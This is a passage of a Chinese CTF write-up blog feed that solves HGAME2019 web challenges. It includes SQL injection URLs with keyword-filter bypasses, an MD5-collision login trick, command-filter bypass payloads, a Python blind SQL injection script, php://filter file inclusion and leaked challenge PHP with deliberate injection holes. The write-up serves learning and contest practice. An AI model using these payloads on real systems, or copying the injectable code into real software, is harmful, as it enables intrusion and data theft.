class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_35078631&#x2F;article&#x2F;details&#x2F;78589926</span><br></pre></td></tr></table></figure><p>不过例子中的左右都是三列，使用union没有问题，而本题中f1ag1nit中只有两个字段，如果直接使用联合注入的话会因为列数不相等报错，所以我们需要给它认为加上一列，payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;120.78.164.84:49098&#x2F;list.php?id&#x3D;-1&#39; uniunionon seselectlect * from (seselectlect 1)a,(seselectlect 2)b,(seselectlect 3)c ununionion seselectlect * from f1ag1nit a,(selselectect 2) b limit 1,2-- +</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;3eaba49ada2ec0aa44ceaa7beee35401&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;第三次双月赛题解&quot;&gt;&lt;a href=&quot;#第三次双月赛题解&quot; class=&quot;headerlink&quot; title=&quot;第三次双月赛题解&quot;&gt;&lt;/a&gt;第三次双月赛题解&lt;/h1&gt;
    
    </summary>
    
      <category term="writeup" scheme="http://chaosec.top/categories/writeup/"/>
    
    
      <category term="CTF" scheme="http://chaosec.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>HGAME2019-Web-Week3&amp;4</title>
    <link href="http://chaosec.top/2019/03/02/hgame2019b/"/>
    <id>http://chaosec.top/2019/03/02/hgame2019b/</id>
    <published>2019-03-02T07:55:12.000Z</published>
    <updated>2019-03-17T13:09:45.519Z</updated>
    
    <content type="html"><![CDATA[<h1 id="week-3"><a href="#week-3" class="headerlink" title="week-3"></a>week-3</h1><a id="more"></a><h2 id="神奇的MD5"><a href="#神奇的MD5" class="headerlink" title="神奇的MD5"></a>神奇的MD5</h2><p>文件探测一下发现存在备份文件泄露<code>.login.php.swp</code>，核心代码如下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (@$_POST[<span class="string">'username'</span>] <span class="keyword">and</span> @$_POST[<span class="string">'password'</span>] <span class="keyword">and</span> @$_POST[<span class="string">'code'</span>])</span><br><span class="line">&#123;</span><br><span class="line">    $username = (string)$_POST[<span class="string">'username'</span>];</span><br><span class="line">    $password = (string)$_POST[<span class="string">'password'</span>];</span><br><span class="line">    $code     = (string)$_POST[<span class="string">'code'</span>];</span><br><span class="line">    <span class="keyword">if</span> (($username == $password ) <span class="keyword">or</span> ($username == $code)  <span class="keyword">or</span> ($password == $code)) &#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Your input can't be the same"</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ((md5($username) === md5($password)) <span class="keyword">and</span> (md5($password) === md5($code)))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Good"</span>; </span><br><span class="line">    </span><br><span class="line">        header(<span class="string">'Location: admin.php'</span>);  </span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt; Invalid password&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>可以看到我们只要生成三个文件内容不同但是MD5值相同的文件就可以了，搜索了一下发现了一篇文章<a href="https://xz.aliyun.com/t/3161" target="_blank" rel="noopener">link</a>，有一个工具fastcoll就可以生成两个MD5值相同的不同文件</p><ol><li>先生成两个MD5值相同的文件<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastcoll_v1.0.0.5.exe -o test0 test1</span><br></pre></td></tr></table></figure></li><li>然后根据test1再生成两个MD5值相同的文件，此时test00，test01的MD5值相同<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fastcoll_v1.0.0.5.exe -p test1 -o test00 test01</span><br></pre></td></tr></table></figure></li><li>将test00的最后128位写入文件a，（-c 128 表示最后128位，tail读文件是从后往前读的，这128位正是test1和test00MD5不同的原因），同理处理一下test01<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tail -c 128 test00 &gt; a</span><br><span class="line">tail -c 128 test01 &gt; b</span><br></pre></td></tr></table></figure></li><li>执行type命令将test0和a的内容写进test10中，将test0和b的内容写入test11<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">type test0 a &gt; test10</span><br><span class="line">type test1 b &gt; test11</span><br></pre></td></tr></table></figure></li></ol><p>于是就生成了test00，test01，test10，test11四个MD5值相同的文件，再用curl编码一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl --data-urlencode username@C:\Users\Snow\Desktop\fastcoll_v1.0.0.5.exe\test00 --data-urlencode password@C:\Users\Snow\Desktop\fastcoll_v1.0.0.5.exe\test01 --data-urlencode code@C:\Users\Snow\Desktop\fastcoll_v1.0.0.5.exe\test10 http:&#x2F;&#x2F;118.25.89.91:8080&#x2F;question&#x2F;login.php -i</span><br></pre></td></tr></table></figure><p>之后可以得到服务器返回的cookie<code>Set-Cookie: PHPSESSID=ff92dae820810170f60ef2a04f027a61; path=/</code>，写入admin.php页面中，发现是个shell终端，可以查看到admin.php源码，关键过滤如下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$cmd = str_replace(<span class="string">"flag"</span>,<span class="string">'none'</span>,$cmd);</span><br></pre></td></tr></table></figure><br>绕过很简单，通配符与单引号都可以绕过</p><p>payload：<code>cat /fl??</code> OR <code>cat /fl&#39;&#39;ag</code></p><p>flag：<code>hgame{a1c83b66cc504d583c09ea6c20c0dabc}</code></p><h2 id="sqli-1"><a href="#sqli-1" class="headerlink" title="sqli-1"></a>sqli-1</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">substr(md5($_GET[<span class="string">"code"</span>]),<span class="number">0</span>,<span class="number">4</span>) === <span class="number">7229</span></span><br></pre></td></tr></table></figure><p>题目需要验证码，可以爆破一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;<span class="number">999999999</span>;$i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(substr(md5($i), <span class="number">0</span>, <span class="number">4</span>)===<span class="string">'803a'</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> $i;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后就是常规的数字型注入了，注意每次都要更新一下code值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code&#x3D;4446&amp;id&#x3D;1 order by 1--+</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code&#x3D;31226&amp;id&#x3D;-1 union select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()--+</span><br></pre></td></tr></table></figure><blockquote><p>f1l1l1l1g,words </p></blockquote><p>不知道为什么表名不对，猜测可能是表名有什么问题，所以用16进制编码一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code&#x3D;70176&amp;id&#x3D;-1 union select group_concat(column_name) from information_schema.columns where table_name&#x3D;0x66316c316c316c3167--+</span><br></pre></td></tr></table></figure><blockquote><p>f14444444g</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code&#x3D;51097&amp;id&#x3D;-1 union select f14444444g from f1l1l1l1g--+</span><br></pre></td></tr></table></figure><p>flag: <code>hgame{sql1_1s_iNterest1ng}</code></p><h2 id="sqli-2"><a href="#sqli-2" class="headerlink" title="sqli-2"></a>sqli-2</h2><p>依然数字型注入，只不过是盲注，本来不想写代码的，哎，还是逃不过。</p><p>PS：由于没注意看题目，结果直接上来时间盲注了，但是等的真的绝望，后来才回过味来可以bool盲注，速度才上来了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">cookies = &#123;<span class="string">'PHPSESSID'</span>:<span class="string">'lseqgohjo9eibfivnemk6sa8vd'</span>&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(_in)</span>:</span></span><br><span class="line">    m = hashlib.md5()</span><br><span class="line">    m.update(_in.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">    <span class="keyword">return</span> m.hexdigest()[<span class="number">0</span>:<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_code</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> url</span><br><span class="line">    res = requests.get(url, cookies=cookies).text</span><br><span class="line">    code = re.findall(<span class="string">r'=== (.&#123;4&#125;)&lt;br&gt;'</span>,res)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9999999999999</span>):</span><br><span class="line">        <span class="keyword">if</span> code == md5(str(i)):</span><br><span class="line">            <span class="keyword">return</span> str(i)</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://118.89.111.179:3001/"</span></span><br><span class="line">output = <span class="string">"hgame&#123;sqli_1s_s0_"</span></span><br><span class="line">succ = <span class="string">"sql error"</span></span><br><span class="line">name_dic = string.digits + string.ascii_lowercase + string.ascii_uppercase + <span class="string">'_&#123;&#125;'</span>  + <span class="string">','</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">18</span>,<span class="number">60</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> name_dic:</span><br><span class="line">        code = get_code()</span><br><span class="line">        <span class="comment"># payload = f'?code=&#123;code&#125;&amp;id=1 and if((substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;str(i)&#125;,1)="&#123;str(j)&#125;"),0,sleep(5))--+'</span></span><br><span class="line">        <span class="comment"># F11111114G,WORDS</span></span><br><span class="line">        <span class="comment"># payload = f'?code=&#123;code&#125;&amp;id=1 and if((substr((select group_concat(column_name) from information_schema.columns where table_name="F11111114G"),&#123;str(i)&#125;,1)="&#123;str(j)&#125;"),0,sleep(5))--+'</span></span><br><span class="line">        <span class="comment"># FL4444AG</span></span><br><span class="line">        payload = <span class="string">f'?code=<span class="subst">&#123;code&#125;</span>&amp;id=1 and if((substr((select FL4444AG from F11111114G),<span class="subst">&#123;str(i)&#125;</span>,1)=binary "<span class="subst">&#123;str(j)&#125;</span>"),sleep(-5),1)--+'</span></span><br><span class="line">        res = requests.get(url+payload,cookies=cookies).text</span><br><span class="line">        <span class="keyword">if</span> succ <span class="keyword">in</span> res:</span><br><span class="line">            output += j</span><br><span class="line">            print(<span class="string">"output: "</span>,output)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>flag如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;sqli_1s_s0_s0_s0_s0_interesting&#125;</span><br></pre></td></tr></table></figure><h2 id="基础渗透"><a href="#基础渗透" class="headerlink" title="基础渗透"></a>基础渗透</h2><p>正常注册登录，发现在点击不同的功能的时候是通过action参数来实现的，比如看到有<code>action=message</code>，猜测是不是存在文件包含，访问message.php页面发现果真存在，尝试文件包含</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;111.231.140.29:10080&#x2F;index.php?action&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index</span><br></pre></td></tr></table></figure><p>得到源码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">"template/header.php"</span>);</span><br><span class="line"><span class="keyword">if</span> (is_null($_SESSION[<span class="string">'user_id'</span>])) &#123;</span><br><span class="line">    header(<span class="string">'Location:/login.php'</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">$page = array_key_exists(<span class="string">'action'</span>, $_GET) ? $_GET[<span class="string">'action'</span>] : <span class="string">'message'</span>;</span><br><span class="line"><span class="keyword">require</span> $page .<span class="string">'.php'</span>;</span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">"template/footer.php"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>functions.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//ini_set("display_errors", "on");</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'config.php'</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sql_query</span><span class="params">($sql_query)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $mysqli;</span><br><span class="line">    $res = $mysqli-&gt;query($sql_query);</span><br><span class="line">    <span class="keyword">return</span> $res;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">csrf_token</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $token = <span class="string">''</span>;</span><br><span class="line">    $chars = str_split(<span class="string">'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'</span>);</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; <span class="number">48</span>; $i++) &#123;</span><br><span class="line">        $token = $token . $chars[random_int(<span class="number">0</span>, <span class="number">61</span>)];</span><br><span class="line">    &#125;</span><br><span class="line">    $_SESSION[<span class="string">'token'</span>] = $token;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;input type='hidden' value='$token' id='token'&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">res_to_json</span><span class="params">($res, $type)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $json[<span class="string">'type'</span>] = $type;</span><br><span class="line">    $json[<span class="string">'status'</span>] = <span class="string">"true"</span>;</span><br><span class="line">    $json[<span class="string">"content"</span>] = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">foreach</span> ($res <span class="keyword">as</span> $message) &#123;</span><br><span class="line"></span><br><span class="line">        $array_tmp[<span class="string">'user_id'</span>] = $message[<span class="string">'user_id'</span>];</span><br><span class="line">        $array_tmp[<span class="string">'user'</span>] = $message[<span class="string">'user'</span>];</span><br><span class="line">        $array_tmp[<span class="string">'avatar'</span>] = get_avatar($message[<span class="string">'user_id'</span>]) != <span class="keyword">null</span> ? get_avatar($message[<span class="string">'user_id'</span>])[<span class="string">'content'</span>] : md5($message[<span class="string">'user'</span>]);</span><br><span class="line">        $array_tmp[<span class="string">'message'</span>] = $message[<span class="string">'content'</span>];</span><br><span class="line">        $array_tmp[<span class="string">'message_id'</span>] = $message[<span class="string">'message_id'</span>];</span><br><span class="line">        $array_tmp[<span class="string">'time'</span>] = $message[<span class="string">'date'</span>];</span><br><span class="line">        array_push($json[<span class="string">"content"</span>], $array_tmp);</span><br><span class="line">    &#125;</span><br><span class="line">    $json[<span class="string">"content"</span>] = $json[<span class="string">"content"</span>];</span><br><span class="line">    <span class="keyword">return</span> json_encode($json);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">judge</span><span class="params">($username, $password)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ($username == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"username's length error!"</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (strlen($password) &lt; <span class="number">6</span> <span class="keyword">or</span> strlen($password) &gt; <span class="number">16</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"password's length error!"</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">register</span><span class="params">($username, $password, $token)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (judge($username, $password) == <span class="number">1</span> <span class="keyword">and</span> $token === $_SESSION[<span class="string">'token'</span>]) &#123;</span><br><span class="line">        $password = md5($password);</span><br><span class="line">        $sql_query = <span class="string">"insert into `users`(`username`,`password`) VALUES ('$username','$password')"</span>;</span><br><span class="line">        $res = sql_query($sql_query);</span><br><span class="line">        <span class="keyword">if</span> ($res) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'register success!'</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'error!'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"error!"</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">($username, $password, $token)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">'login'</span>]) <span class="keyword">and</span> $token === $_SESSION[<span class="string">'token'</span>]) &#123;</span><br><span class="line">        $password = md5($password);</span><br><span class="line">        $sql_query = <span class="string">"select * from `users` where `username`='$username' and `password`='$password'"</span>;</span><br><span class="line">        $res = sql_query($sql_query);</span><br><span class="line">        <span class="keyword">if</span> ($res-&gt;num_rows) &#123;</span><br><span class="line">            $data = $res-&gt;fetch_array();</span><br><span class="line">            $_SESSION[<span class="string">'user_id'</span>] = $data[<span class="string">'user_id'</span>];</span><br><span class="line">            $_SESSION[<span class="string">'user'</span>] = $data[<span class="string">'username'</span>];</span><br><span class="line">            $_SESSION[<span class="string">'groups'</span>] = $data[<span class="string">'groups'</span>];</span><br><span class="line">            $_SESSION[<span class="string">'login'</span>] = <span class="number">1</span>;</span><br><span class="line">            setcookie(<span class="string">'user'</span>, $_SESSION[<span class="string">'user'</span>]);</span><br><span class="line">            setcookie(<span class="string">'groups'</span>, $_SESSION[<span class="string">'groups'</span>]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"error!"</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"error!"</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">loginout</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ($_GET[<span class="string">'loginout'</span>] === $_SESSION[<span class="string">'token'</span>]) &#123;</span><br><span class="line">        session_destroy();</span><br><span class="line">        setcookie(<span class="string">'groups'</span>, <span class="keyword">null</span>);</span><br><span class="line">        setcookie(<span class="string">'user'</span>, <span class="keyword">null</span>);</span><br><span class="line">        Header(<span class="string">"Location: index.php"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_avatar</span><span class="params">($user_id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $sql_query = <span class="string">"select `avatar` from `users` where `user_id`=$user_id"</span>;</span><br><span class="line">    $res = sql_query($sql_query)-&gt;fetch_row()[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">if</span> ($res) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">'name'</span> =&gt; $res, <span class="string">'content'</span> =&gt; base64_encode(file_get_contents(<span class="string">'./img/avatar/'</span> . $res . <span class="string">'.png'</span>)));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_new_messages</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $start = $_GET[<span class="string">'start'</span>] ?? <span class="number">0</span>;</span><br><span class="line">    $start = addslashes($start);</span><br><span class="line">    $user_id = $_SESSION[<span class="string">'user_id'</span>];</span><br><span class="line">    $sql_query = <span class="string">"select * from `messages` where `user_id`=$user_id LIMIT $start,999999999999"</span>;</span><br><span class="line">    $res = sql_query($sql_query);</span><br><span class="line">    <span class="keyword">if</span> ($res-&gt;num_rows) &#123;</span><br><span class="line">        <span class="keyword">return</span> res_to_json($res, <span class="string">"messages"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_messages</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $start = $_GET[<span class="string">'start'</span>] ?? <span class="number">0</span>;</span><br><span class="line">    $start = addslashes($start);</span><br><span class="line">    $user_id = $_SESSION[<span class="string">'user_id'</span>];</span><br><span class="line">    $sql_query = <span class="string">"select * from `messages` where `user_id`=$user_id ORDER BY `message_id` DESC LIMIT $start,12"</span>;</span><br><span class="line">    $res = sql_query($sql_query);</span><br><span class="line">    <span class="keyword">if</span> ($res-&gt;num_rows) &#123;</span><br><span class="line">        <span class="keyword">return</span> res_to_json($res, <span class="string">"messages"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add_message</span><span class="params">($message)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ($_POST[<span class="string">'token'</span>] === $_SESSION[<span class="string">'token'</span>]) &#123;</span><br><span 